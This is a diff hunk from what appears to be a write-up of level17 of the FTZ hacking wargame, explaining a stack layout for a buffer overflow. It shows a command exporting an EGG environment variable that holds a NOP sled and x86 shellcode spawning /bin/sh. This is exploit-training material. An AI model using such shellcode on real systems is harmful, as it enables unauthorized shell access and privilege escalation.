@@ -35,7 +35,7 @@ In level16, we could understand the memory size.
 
 buf(20bytes) + dummy(20bytes) + \*printit(4bytes,0xbffff048) + crap(4bytes,0xbffff04c) + dummy(8bytes) + SPF(4bytes) + RET(4bytes).
 
-I will make egg.c(shell code) and getegg.c(to get shell code address).
+I will make the env variable of EGG(shell code) and then made and run getegg.c (to get EGG's address).
 
 ```
 [level17@ftz level17]$ export EGG=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
